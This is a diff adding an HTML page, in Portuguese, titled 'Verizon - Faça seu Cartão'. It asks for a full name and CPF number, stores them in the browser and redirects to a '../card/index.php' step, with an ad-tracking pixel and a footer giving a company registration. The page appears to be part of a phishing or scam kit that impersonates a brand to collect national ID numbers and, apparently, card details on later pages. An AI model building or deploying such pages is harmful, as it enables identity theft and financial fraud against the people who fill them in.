@@ -1,0 +1,97 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verizon - Faça seu Cartão</title>
+    <link href="css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="assets/style.css">
+    
+<script src="js/latest.js" async="" defer=""></script>
+
+<script>
+  window.pixelId = "66bb763debbcebab27d68442";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script><script async="" defer="" src="js/pixel.js"></script>
+    
+</head><body>
+    <link rel="stylesheet" href="css/style.css">
+    <link rel="stylesheet" href="css/all.min.css">
+
+<div style="
+  display: grid;
+  grid-template-areas:
+    'top-bar'
+    'content'
+    'footer';
+  grid-template-rows: auto 1fr auto;
+  min-height: 100vh;
+">    
+<div class="header">
+        <img style="width: 160px;" src="images/VfoPzxB.png" alt="Imagem Centralizada"> 
+    </div>
+
+    <div style="grid-area: content; padding: 0 1rem;"> 
+        <!-- Seção 7: Formulário de Cadastro -->
+        <div style="margin-top: 40px;" class="main-content">
+            <div id="formulario" class="mb-3">
+                <p style="color:#111; text-align:initial">Preencha os campos abaixo</p>
+                <form id="cadastroForm" style="text-align:initial" onsubmit="processarFormulario(event)">
+                    <div class="mb-3">
+                        <label for="nome" class="form-label" style="font-size:14px">Nome completo</label>
+                        <input type="text" class="form-control" id="nome" placeholder="Ex: Maria">
+                    </div>
+                    <div class="mb-3">
+                        <label for="cpf" class="form-label" style="font-size:14px">CPF</label>
+                        <input type="text" class="form-control" id="cpf" placeholder="000.000.000-00">
+                    </div>
+                    <div id="loader" style="display: none; text-align: center; margin-bottom: 15px;">
+                        <i class="fas fa-spinner fa-spin" style="font-size: 2em; color: #111;"></i>
+                    </div>
+                    <button type="submit" class="btn btn-custom">Continuar</button>
+                </form>
+            </div>
+        </div>
+    </div> 
+
+    <script>
+        function processarFormulario(event) {
+            event.preventDefault(); // Evita o envio padrão do formulário
+
+            // Obtem os valores dos campos
+            const nome = document.getElementById('nome').value;
+            const cpf = document.getElementById('cpf').value;
+
+            // Validação simples
+            if (!nome || !cpf) {
+                alert('Por favor, preencha todos os campos.');
+                return;
+            }
+
+            // Armazena os dados no localStorage
+            const dadosUsuario = {
+                nome: nome,
+                cpf: cpf,
+            };
+
+            localStorage.setItem('dadosUsuarioUni', JSON.stringify(dadosUsuario));
+
+            // Redireciona para a próxima página
+            location.href = '../card/index.php';
+        }
+    </script>
+    <script src="js/scriptValida.js"></script>
+    <div class="footer py-4" id="footerChg">
+        © 2024 Verizon S/A. CNPJ 68.694.585/0001-20. <br>
+        Av. Brig. Faria Lima, 1811, São Paulo/SP
+    </div>
+
+    <script src="js/bootstrap.bundle.min.js"></script>
+
+
+
+
+</div>
+</body></html>
